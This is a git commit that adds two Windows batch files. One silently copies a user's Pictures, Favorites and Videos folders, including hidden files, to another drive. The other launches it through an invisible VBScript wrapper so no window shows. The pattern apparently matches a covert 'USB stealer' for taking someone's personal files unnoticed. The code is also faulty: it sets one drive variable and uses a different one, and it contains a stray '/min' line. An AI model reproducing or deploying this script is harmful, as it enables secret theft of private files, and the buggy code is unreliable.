57a1182591bbdb940848730f91ae28782a7652ef
HUMURA ELVIN <humura@humura>
2024-04-11 12:10:59 +0200

    Uploaded Files

---
+++ file.bat
@@ -0,0 +1,11 @@
+@echo off 
+:: variables
+/min
+SET odrive=%odrive:~0,2%
+set backupcmd=xcopy /s /c /d /e /h /i /r /y
+echo off
+%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\My pics"
+%backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites"
+%backupcmd% "%USERPROFILE%\videos" "%drive%\all\vids"
+@echo off
+cls
---
+++ launch.bat
@@ -0,0 +1,1 @@
+wscript.exe \invisible.vbs file.bat
